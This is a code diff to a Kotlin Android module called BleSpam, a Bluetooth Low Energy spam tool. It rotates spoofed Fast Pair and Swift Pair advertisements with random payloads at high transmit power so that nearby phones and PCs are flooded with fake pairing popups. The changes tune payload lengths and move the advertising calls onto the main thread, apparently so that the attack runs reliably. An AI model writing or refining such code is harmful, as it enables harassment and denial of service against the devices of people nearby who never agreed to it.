@@ -10,6 +10,8 @@ import android.bluetooth.le.BluetoothLeAdvertiser
 import android.content.Context
 import android.content.pm.PackageManager
 import android.os.Build
+import android.os.Handler
+import android.os.Looper
 import android.os.ParcelUuid
 import kotlinx.coroutines.*
 import kotlin.random.Random
@@ -20,6 +22,7 @@ object BleSpam {
     private var advertiser: BluetoothLeAdvertiser? = null
     private var job: Job? = null
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    private val mainHandler = Handler(Looper.getMainLooper())
     private val cb = object : AdvertiseCallback() {}
 
     private fun man(company: Int, data: ByteArray): AdvertiseData =
@@ -45,7 +48,7 @@ object BleSpam {
     )
 
     private fun androidPool() = listOf(
-        svcFull("0000fe2c-0000-1000-8000-00805f9b34fb", byteArrayOf(0x00) + rnd(3) + rnd(6)),
+        svcFull("0000fe2c-0000-1000-8000-00805f9b34fb", byteArrayOf(0x00) + rnd(3) + rnd(2)),
         svcFull("0000fe2c-0000-1000-8000-00805f9b34fb", byteArrayOf(0x01) + rnd(3) + rnd(8))
     )
 
@@ -56,9 +59,13 @@ object BleSpam {
     )
 
     private fun windows() = listOf(
-        svcFull("0000fd69-0000-1000-8000-00805f9b34fb", rnd(8)),
-        svcFull("0000fd69-0000-1000-8000-00805f9b34fb", rnd(5))
+        svcFull("0000fd69-0000-1000-8000-00805f9b34fb", rnd(11)),
+        svcFull("0000fd69-0000-1000-8000-00805f9b34fb", rnd(11))
     )
+
+    fun needsPermission(ctx: Context): Boolean =
+        Build.VERSION.SDK_INT >= 31 &&
+        ctx.checkSelfPermission(Manifest.permission.BLUETOOTH_ADVERTISE) != PackageManager.PERMISSION_GRANTED
 
     @SuppressLint("MissingPermission")
     fun start(ctx: Context, mode: Int) {
@@ -67,9 +74,7 @@ object BleSpam {
         val adapter = bm?.adapter
         if (adapter == null) { status = "NO BT ADAPTER"; return }
         if (!adapter.isEnabled) { status = "BT OFF — включи bluetooth"; return }
-        if (Build.VERSION.SDK_INT >= 31 &&
-            ctx.checkSelfPermission(Manifest.permission.BLUETOOTH_ADVERTISE) != PackageManager.PERMISSION_GRANTED
-        ) { status = "NO ADVERTISE PERM"; return }
+        if (needsPermission(ctx)) { status = "NO ADVERTISE PERM — нажми еще раз после запроса"; return }
         advertiser = adapter.bluetoothLeAdvertiser
         if (advertiser == null) { status = "ADVERTISER UNSUPPORTED"; return }
 
@@ -86,17 +91,20 @@ object BleSpam {
             var i = 0
             while (running && isActive) {
                 val data = pool[i % pool.size]
-                try { advertiser?.stopAdvertising(cb) } catch (e: Exception) {}
-                val settings = AdvertiseSettings.Builder()
-                    .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
-                    .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
-                    .setConnectable(false)
-                    .build()
-                try {
-                    advertiser?.startAdvertising(settings, data, cb)
-                    status = "ADV STARTED · cycle $i/${pool.size}"
-                } catch (e: Exception) {
-                    status = "EXC: ${e.message}"
+                val idx = i
+                mainHandler.post {
+                    try {
+                        advertiser?.stopAdvertising(cb)
+                        val settings = AdvertiseSettings.Builder()
+                            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
+                            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
+                            .setConnectable(false)
+                            .build()
+                        advertiser?.startAdvertising(settings, data, cb)
+                        status = "ADV STARTED · cycle $idx/${pool.size}"
+                    } catch (e: Exception) {
+                        status = "EXC: ${e.message}"
+                    }
                 }
                 i++
                 delay(2000)
@@ -108,7 +116,9 @@ object BleSpam {
     fun stop() {
         running = false
         job?.cancel()
-        try { advertiser?.stopAdvertising(cb) } catch (e: Exception) {}
+        mainHandler.post {
+            try { advertiser?.stopAdvertising(cb) } catch (e: Exception) {}
+        }
         status = "IDLE"
     }
 
